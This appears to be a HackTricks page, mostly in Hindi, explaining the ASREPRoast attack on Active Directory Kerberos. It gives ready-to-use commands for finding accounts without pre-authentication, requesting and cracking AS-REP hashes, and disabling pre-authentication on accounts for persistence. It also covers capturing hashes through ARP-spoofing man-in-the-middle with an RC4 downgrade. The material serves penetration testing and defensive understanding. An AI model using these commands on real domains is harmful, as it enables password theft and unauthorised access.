# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast एक security attack है जो उन users का exploit करता है जिनमें **Kerberos pre-authentication required attribute** नहीं होता। मूल रूप से, यह vulnerability attackers को Domain Controller (DC) से किसी user के लिए authentication request करने देती है, बिना user के password की जरूरत के। फिर DC एक message के साथ response देता है जो user के password-derived key से encrypted होता है, जिसे attackers offline crack करने की कोशिश कर सकते हैं ताकि user का password पता चल सके।

इस attack की मुख्य requirements हैं:

- **Kerberos pre-authentication की कमी**: target users पर यह security feature enabled नहीं होना चाहिए।
- **Domain Controller (DC) से connection**: attackers को requests भेजने और encrypted messages प्राप्त करने के लिए DC तक access चाहिए।
- **Optional domain account**: domain account होने से attackers LDAP queries के जरिए vulnerable users को ज्यादा efficiently identify कर सकते हैं। ऐसे account के बिना, attackers को usernames guess करने होंगे।

#### Vulnerable users को enumerate करना (domain credentials चाहिए)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP संदेश का अनुरोध
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus डिफ़ॉल्ट रूप से **RC4** request करता है, इसलिए Event ID **4768** आमतौर पर **preauth type 0** और **ticket encryption type 0x17** दिखाता है। अगर आप **`/aes`** जोड़ते हैं (या target के लिए RC4 disabled है), तो इसके बजाय **AES etypes** की अपेक्षा करें।

#### Quick one-liners (Linux)

- संभावित targets पहले enumerate करें (जैसे leaked build paths से) Kerberos userenum के साथ: `kerbrute userenum users.txt -d domain --dc dc.domain`
- valid creds के बिना NetExec का उपयोग करके पूरी username list roast करें: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- अगर आपके पास creds हैं, तो NetExec से LDAP query कराएँ और हर roastable account के लिए request करें: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- अगर output **`$krb5asrep$23$`** से शुरू होता है, तो इसे Hashcat **`-m 18200`** से crack करें। अगर यह **`$krb5asrep$17$`** या **`$krb5asrep$18$`** से शुरू होता है, तो John **`--format=krb5asrep`** को prefer करें।

### Cracking

यह assume न करें कि हर AS-REP roast RC4 है। Modern tooling requested/negotiated enctype के आधार पर **RC4** (`$krb5asrep$23$`) या **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) return कर सकता है। **`hashcat -m 18200`** **etype 23** के लिए है, जबकि **John** **17/18/23** के लिए `krb5asrep` को सीधे handle करता है।
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### स्थायित्व

उस user के लिए **preauth** को force करके not required बनाएं, जहाँ आपके पास **GenericAll** permissions हों (या properties write करने की permissions हों):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast बिना credentials

एक attacker man-in-the-middle position का use करके AS-REP packets को तब capture कर सकता है जब वे network से traverse कर रहे हों, बिना इस बात पर rely किए कि Kerberos pre-authentication disabled है। इसलिए यह VLAN के सभी users के लिए काम करता है।\
अगर आप related no-credential trick चाहते हैं जो no-preauth principal से **TGT** की बजाय **service ticket** return करता है, तो [Kerberoast](kerberoast.md) देखें।

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) हमें ऐसा करने देता है। `relay` mode offensively ज़्यादा interesting है क्योंकि यह **RC4** को force कर सकता है जब client अभी भी **etype 23** advertise करता है; `listen` passive रहता है और बस वही capture करता है जो client/DC ने negotiate किया हो।
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
